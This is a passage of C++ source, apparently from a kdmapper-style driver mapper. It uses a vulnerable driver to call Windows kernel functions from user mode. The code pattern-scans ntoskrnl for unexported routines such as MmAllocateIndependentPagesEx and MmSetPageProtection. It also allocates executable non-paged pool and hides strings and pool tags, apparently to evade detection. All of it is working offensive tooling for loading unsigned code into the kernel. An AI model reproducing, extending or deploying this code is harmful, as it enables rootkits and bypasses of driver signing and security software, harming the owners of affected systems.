		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000)
				return 0;

			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

PVOID vdrv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

struct CachedSection {
	uint64_t module_base;
	std::string section_name;
	uint64_t section_vaddr;
	uint32_t section_size;
	std::vector<uint8_t> data;
};

static std::vector<CachedSection> g_section_cache;

static CachedSection* GetOrCacheSection(const char* sectionName, uint64_t modulePtr) {
	for (auto& c : g_section_cache) {
		if (c.module_base == modulePtr && c.section_name == sectionName)
			return &c;
	}

	ULONG sectionSize = 0;
	uintptr_t section = vdrv::FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	if (!section || !sectionSize)
		return nullptr;

	if (sectionSize > 64 * 1024 * 1024)
		return nullptr;

	CachedSection newEntry;
	newEntry.module_base = modulePtr;
	newEntry.section_name = sectionName;
	newEntry.section_vaddr = section;
	newEntry.section_size = sectionSize;
	newEntry.data.resize(sectionSize);
	if (!vdrv::ReadMemory(section, newEntry.data.data(), sectionSize))
		return nullptr;

	g_section_cache.push_back(std::move(newEntry));
	return &g_section_cache.back();
}

uintptr_t vdrv::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress)
		return 0;

	if (dwLen > 1024 * 1024 * 1024)
		return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen))
		return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0)
		return 0;

	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t vdrv::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000))
		return 0;

	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize)
		return 0;

	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t vdrv::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	CachedSection* cs = GetOrCacheSection(sectionName, modulePtr);
	if (!cs)
		return 0;

	uintptr_t local_result = kdmUtils::FindPattern((uintptr_t)cs->data.data(), cs->section_size, bMask, szMask);
	if (local_result <= 0)
		return 0;

	return cs->section_vaddr + (local_result - (uintptr_t)cs->data.data());
}

uint64_t vdrv::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();

	static uint64_t kernel_ExAllocatePool2 = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePool2"));
	if (kernel_ExAllocatePool2) {
		const uint64_t POOL_FLAG_NON_PAGED          = 0x0000000000000040ull;
		const uint64_t POOL_FLAG_NON_PAGED_EXECUTE  = 0x0000000000000080ull;
		uint64_t flags = POOL_FLAG_NON_PAGED_EXECUTE;
		uint64_t allocated_pool = 0;
		if (CallKernelFunction(&allocated_pool, kernel_ExAllocatePool2, flags, size, (uint64_t)randomTag) && allocated_pool)
			return allocated_pool;
	}

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
	if (!kernel_ExAllocatePool)
		return 0;

	uint64_t allocated_pool = 0;
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
		return 0;

	return allocated_pool;
}

bool vdrv::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExFreePool"));
	if (!kernel_ExFreePool)
		return 0;

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t vdrv::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};
	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = vdrv::FindPatternInSectionAtKernel((char*)".text", vdrv::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;

		kernel_MmAllocateIndependentPagesEx += 8;
		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;
	}

	if (!vdrv::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool vdrv::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages)
				return false;

			kernel_MmFreeIndependentPages += 9;
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages)
			return false;
	}

	uint64_t result{};
	return vdrv::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN vdrv::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
		return FALSE;

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {
			kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");
			if (!kernel_MmSetPageProtection)
				return FALSE;
			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection)
			return FALSE;
	}

	BOOLEAN set_prot_status{};
	if (!vdrv::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}
